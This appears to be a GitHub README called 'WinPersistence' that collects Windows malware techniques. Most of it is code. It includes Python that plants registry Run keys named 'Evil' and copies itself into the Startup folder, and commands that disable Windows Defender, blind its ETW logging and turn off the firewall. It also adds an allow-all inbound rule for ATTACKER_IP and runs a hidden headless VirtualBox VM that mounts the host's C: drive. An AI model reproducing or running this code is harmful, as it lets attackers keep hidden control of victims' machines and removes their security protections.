<h1 align="center">
  <br>
  <br>
  WinPersistence
  <br>  
</h1>

### Description
Some of the techniques used in Malware Windows - Persistence(Registry HKCU,startup),Disable Windows Firewall,Disable Windows Defender




### Registry Key
```python

def reg_windows1(self):
  from os import system , environ
  malw_location = environ["appdata"]+"\\anyname.exe" # You can add any name to your Malware and any other path other than this <appdate>
  system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d'+ malw_location +'"', shell=True)  
  system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d'+ malw_location +'"', shell=True)  
  system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d'+ malw_location +'"', shell=True)  
  system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d'+ malw_location +'"', shell=True)  
	

```	
### StartUp
```python
from os import environ , system
from sys import executable
class Reg:
	def __init__(self):
		self.malw_location = environ["appdata"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\anyname.exe"
	def startup(self):
		try:
			if not path.exists(self.malw_location):
				copyfile(executable, self.malw_location)
		except Exception as e:
			print(e)
De3vil = Reg()
De3vil.startup()
```
### Disable Windows Defender
```python

def DisableWindowsDefender():
	import ctypes, sys
	import subprocess 
	if ctypes.windll.shell32.IsUserAnAdmin() == 1: # 1 == True (admin ):: 0 == False
		subprocess.call("Set-MpPreference -DisableRealtimeMonitoring $true",shell=True)
	else:
		pass
	try:
		# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
		subprocess.call('reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f')
		# Disable Windows Defender Security Center
		subprocess.call('"reg add HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f"')
		# Disable Real Time Protection
		subprocess.call('reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f ')
		# or
		subprocess.call('reg add"HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f')
		# or
		subprocess.call('reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f')
  except Exception:
  	pass

```
### Disable Windows Firewall

```powershell
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off

# ip whitelisting
New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
```


### Virtual Machines

> Based on the Shadow Bunny technique.

```ps1
# download virtualbox
Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe

# perform a silent install and avoid creating desktop and quick launch icons
VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0

# in \Program Files\Oracle\VirtualBox\VBoxManage.exe
# Disabling notifications
.\VBoxManage.exe setextradata global GUI/SuppressMessages "all" 

# Download the Virtual machine disk
Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd

# Create a new VM
$vmname = "IT Recovery"
.\VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register

# Add a network card in NAT mode
.\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit
.\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
.\VBoxManage.exe modifyvm $vmname --nic1 nat
.\VBoxManage.exe modifyvm $vmname --audio none
.\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
.\VBoxManage.exe modifyvm $vmname --description "Shadowbunny"

# Mount the VHD file
.\VBoxManage.exe storagectl $vmname -name "SATA Controller" -add sata
.\VBoxManage.exe storageattach $vmname -comment "Shadowbunny Disk" -storagectl "SATA Controller" -type hdd -medium "$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd" -port 0

# Start the VM
.\VBoxManage.exe startvm $vmname –type headless 


# optional - adding a shared folder
# require: VirtualBox Guest Additions
.\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\ -automount
# then mount the folder in the VM
sudo mkdir /mnt/c
sudo mount -t vboxsf shadow_c /mnt/c
```

